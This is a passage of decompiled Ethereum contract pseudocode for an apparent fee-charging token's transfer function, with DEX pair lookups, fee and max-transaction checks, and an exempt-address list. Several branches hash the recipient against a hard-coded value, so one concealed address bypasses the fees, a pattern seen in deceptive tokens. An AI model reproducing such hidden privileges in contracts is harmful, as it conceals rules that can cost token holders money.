                    _11550 = mem[_11544]
                    require mem[_11544] == mem[_11544 + 12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11568 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _11574 = mem[_11568]
                    require mem[_11568] == mem[_11568 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_11574)
                    require ext_code.size(address(_11550))
                    staticcall address(_11550).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_11574)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11592 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    require mem[_11592] == mem[_11592 + 12 len 20]
                    if arg1 != mem[_11592 + 12 len 20]:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11646 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11678 = mem[_11646]
                        require mem[_11646] == mem[_11646 + 12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11718 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11735 = mem[_11718]
                        require mem[_11718] == mem[_11718 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_11735)
                        require ext_code.size(address(_11678))
                        staticcall address(_11678).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_11735)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11829 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11889 = mem[_11829]
                        require mem[_11829] == mem[_11829 + 12 len 20]
                        if mem[_11829 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12151 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12151 + 32 len mem[_12151]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_11889):
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12203 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12203 + 32 len mem[_12203]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 16
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _11680 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_11680 + 32 len mem[_11680]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(msg.sender)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            require ext_code.size(stor10)
                            staticcall stor10.factory() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _11652 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _11688 = mem[_11652]
                            require mem[_11652] == mem[_11652 + 12 len 20]
                            require ext_code.size(stor10)
                            staticcall stor10.WETH() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _11724 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _11748 = mem[_11724]
                            require mem[_11724] == mem[_11724 + 12 len 20]
                            mem[mem[64] + 4] = this.address
                            mem[mem[64] + 36] = address(_11748)
                            require ext_code.size(address(_11688))
                            staticcall address(_11688).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(_11748)
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _11868 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _11910 = mem[_11868]
                            require mem[_11868] == mem[_11868 + 12 len 20]
                            if mem[_11868 + 12 len 20] != msg.sender:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _12208 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12208 + 32 len mem[_12208]]):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if this.address == arg1:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if msg.sender == address(_11910):
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < 0:
                                                                revert with 0, 17
                                                            if balanceOf[0] > -1:
                                                                revert with 0, 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !arg2:
                                                                revert with 0, 17
                                                            balanceOf[arg1] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 0, 17
                                                            if not arg2:
                                                                revert with 0, 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 0, 17
                                                            if balanceOf[0] > !(arg2 * _fee / 100):
                                                                revert with 0, 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                                revert with 0, 17
                                                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
